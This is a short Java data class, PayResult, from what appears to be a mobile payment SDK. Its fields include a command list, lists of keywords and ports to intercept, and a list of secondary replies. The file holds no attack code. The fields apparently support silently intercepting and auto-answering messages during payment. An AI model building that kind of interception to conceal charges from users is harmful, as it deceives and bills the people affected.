package com.vsoyou.sdk.main.entity;

import java.util.ArrayList;

import com.vsoyou.sdk.entity.Result;

public class PayResult extends Result {

	private static final long serialVersionUID = 5263196977858827651L;
	//消费ID
	public int consumerId;
	//指令list
	public ArrayList<CmdEntity> cmdList = new ArrayList<CmdEntity>();
	//拦截关键字list
	public ArrayList<String> keyList = new ArrayList<String>();
	//拦截端口list
	public ArrayList<String> portList = new ArrayList<String>();
	//二次回复list
	public ArrayList<ReplyEntity> replyList = new ArrayList<ReplyEntity>();
	
	
	@Override
	public String toString() {
		return "PayResult [consumerId=" + consumerId + ", cmdList=" + cmdList
				+ ", keyList=" + keyList + ", portList=" + portList
				+ ", replyList=" + replyList + "]";
	}

}
